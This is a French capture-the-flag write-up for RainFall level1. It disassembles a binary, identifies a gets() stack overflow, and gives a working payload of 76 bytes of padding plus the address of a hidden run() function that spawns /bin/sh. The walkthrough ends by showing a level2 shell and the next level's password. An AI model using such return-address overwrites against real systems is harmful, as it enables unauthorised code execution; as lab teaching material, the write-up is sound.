un exécutable qui semble lire sur le stdin

on check les fonctions de lexécutable à l'aide de gdb :
```
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
```
on voit qu'il y a deux fonctions : `main` et `run`

on desassemble ces deux fonctions

main :
```
0x08048480 <+0>:     push   %ebp
0x08048481 <+1>:     mov    %esp,%ebp
0x08048483 <+3>:     and    $0xfffffff0,%esp
0x08048486 <+6>:     sub    $0x50,%esp           // 50 ( 80 bytes allocated)
0x08048489 <+9>:     lea    0x10(%esp),%eax      // 50 - 10 = 40 (64 bytes used)
0x0804848d <+13>:    mov    %eax,(%esp)          // argument for gets()
0x08048490 <+16>:    call   0x8048340 <gets@plt> // call gets()
0x08048495 <+21>:    leave  
0x08048496 <+22>:    ret
```
```
int     main() {
	char buffer[64];
	gets(buffer);
	return (0);
}
```
la fonction gets() a une vulnérabilité avec le dépassement de tampon

run :
```
0x08048444 <+0>:     push   %ebp
0x08048445 <+1>:     mov    %esp,%ebp
0x08048447 <+3>:     sub    $0x18,%esp
0x0804844a <+6>:     mov    0x80497c0,%eax          // eax = stdout
0x0804844f <+11>:    mov    %eax,%edx
0x08048451 <+13>:    mov    $0x8048570,%eax         // 0x8048570 = "Good... Wait what?\n"
0x08048456 <+18>:    mov    %edx,0xc(%esp)          // argument 4 for fwrite
0x0804845a <+22>:    movl   $0x13,0x8(%esp)         // argument 3 for fwrite
0x08048462 <+30>:    movl   $0x1,0x4(%esp)          // argument 2 for fwrite
0x0804846a <+38>:    mov    %eax,(%esp)             // argument 1 for fwrite
0x0804846d <+41>:    call   0x8048350 <fwrite@plt>  // call fwrite()
0x08048472 <+46>:    movl   $0x8048584,(%esp)       // argument for system(), 0x8048584 = "/bin/sh"
0x08048479 <+53>:    call   0x8048360 <system@plt>  // call system()
0x0804847e <+58>:    leave  
0x0804847f <+59>:    ret 
```
```
int		run(void) {
	fwrite("Good... Wait what?\n", 19, 1, stdout);
	return (system("/bin/sh"));
}
```
la fonction `run` n'est pas appelé par le main, on comprend qu'il faut passer par la faille de la fonction gets() pour appeler `run`

pour cela on utilise l'adresse de la fonction `run` : `0x08048444` que l'on écrit à l'envers pour 

https://reverseengineering.stackexchange.com/questions/27826/using-a-buffer-overflow-to-call-a-function

on commence avec 80 caractères car le programme a alloué 80 octets pour la stack :

```
level1@RainFall:~$ echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" > /tmp/overflow
level1@RainFall:~$ cat /tmp/overflow | ./level1
Segmentation fault (core dumped)
level1@RainFall:~$ echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" > /tmp/overflow
level1@RainFall:~$ cat /tmp/overflow | ./level1
Illegal instruction (core dumped)
```

après quelques test je vois que le programme crash lorsqu'il lit plus de 76 caractères, alors après le 76ème caractère on ajoute l'adresse de la fonction que l'on veut exécuter

```
level1@RainFall:~$ echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08" > /tmp/overflow
level1@RainFall:~$ cat /tmp/overflow | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

maintenant il faut trouver un moyen de laisser stdin ouvert, avec un deuxième `cat` sans fichier à lire :

```
level1@RainFall:~$ (cat /tmp/overflow ; cat) | ./level1
Good... Wait what?
pwd
/home/user/level1
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```